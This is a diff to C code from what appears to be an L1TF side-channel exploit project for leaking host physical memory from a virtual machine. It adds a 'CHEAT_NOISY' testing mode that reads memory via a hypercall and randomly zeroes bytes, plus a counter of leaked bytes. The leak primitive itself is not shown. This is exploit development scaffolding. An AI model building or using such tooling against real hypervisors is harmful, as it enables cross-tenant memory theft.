@@ -3,6 +3,8 @@
 #include "leak.h"
 #include "l1tf.h"
 
+u64 leak_attempts = 0; // in bytes
+
 hpa_t gadget_base(void)
 {
 #if defined(BASE)
@@ -14,11 +16,17 @@ hpa_t gadget_base(void)
 
 void leak(void *data, hpa_t base, hpa_t pa, int len)
 {
-#if LEAK == CHEAT
+	leak_attempts += len;
+#if LEAK == CHEAT || LEAK == CHEAT_NOISY
         u64 *buf = malloc(len + 8);
         for (int off = 0; off < len; off += 8)
                 buf[off/8] = hc_read_pa(pa+off);
         memcpy(data, buf, len);
+#if LEAK == CHEAT_NOISY
+	for (int i = 0; i < len; i++)
+		if (rand() % 9 == 0)
+			((char *)data)[i] = 0;
+#endif
         return;
 #endif
         l1tf_leak(data, base, pa, len);
@@ -26,11 +34,8 @@ void leak(void *data, hpa_t base, hpa_t pa, int len)
 
 u64 leak64(hpa_t base, hpa_t pa)
 {
-#if LEAK == CHEAT
-        return hc_read_pa(pa);
-#endif
         u64 val;
-        l1tf_leak((char *)&val, base, pa, sizeof(val));
+        leak(&val, base, pa, sizeof(val));
         return val;
 }
 
